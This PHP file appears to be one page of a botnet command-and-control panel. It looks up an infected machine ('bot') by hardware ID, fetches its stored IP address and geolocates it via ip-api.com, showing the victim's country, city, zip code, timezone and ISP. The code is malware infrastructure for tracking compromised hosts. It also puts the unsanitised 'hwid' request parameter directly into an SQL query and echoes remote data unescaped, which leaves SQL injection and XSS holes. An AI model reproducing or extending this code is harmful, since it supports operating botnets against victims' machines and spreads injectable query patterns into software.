<?php include('header.php'); ?>

<?php

$hwid = $_GET['hwid'];

if(isset($hwid)){


    $q_hwid = mysqli_query($condb,"SELECT * FROM `bot` WHERE `HWID`='$hwid'");
    $get_a = @mysqli_fetch_array($q_hwid);
    $ip = $get_a['IP'];
    $loc = json_decode(file_get_contents('http://ip-api.com/json/'.$ip), true);
    $country = $loc['country'];
    $countryCode = $loc['countryCode'];
    $region = $loc['region'];
    $regionName = $loc['regionName'];	
    $city = $loc['city'];
    $zip = $loc['zip'];	
    $timezone = $loc['timezone'];
    $isp = $loc['isp'];

    echo '</div><div class="row">
    <div class="col-md-12">
                 <!--Panel News-->
                 <div class="panel panel-default" style="background-image: linear-gradient(to bottom,#232323 0,#232323 100%); margin-top:10px;">
         <div class="panel-heading">
           <h3 class="panel-title">location and address</h3>
         </div>
         <div class="panel-body">
           <div class="row">
             <div class=" col-md-12 col-lg-12"> 
               <br><br><br><table class="table table-bordered">
                 <tbody>

                 <tr>
                 <td>Country :  </td>
                 <td>'.$country.'</td>
                 <td>Country Code : </td>
                 <td>'.$countryCode.'</td>
                 </tr>
                 
                 <tr>
                 <td>Region : </td>
                 <td>'.$region.'</td>
                 <td>RegionName : </td>
                 <td>'.$regionName.'</td>
                 </tr>
                 
                 <tr>
                 <td>City : </td>
                 <td>'.$city.'</td>
                 <td>Zip code : </td>
                 <td>'.$zip.'</td>
                 </tr>
                 
                 <tr>
                 <td>Timezone : </td>
                 <td>'.$timezone.'</td>
                 <td>ISP : </td>
                 <td>'.$isp.'</td>
                 </tr>          
              
                 
                   
                 </tbody>
               </table>
               
             </div>
           </div>
         </div>
   </div>






                    <!--Panel News-->
     </div>
</div>';



}




?>




<?php include('footer.php'); ?>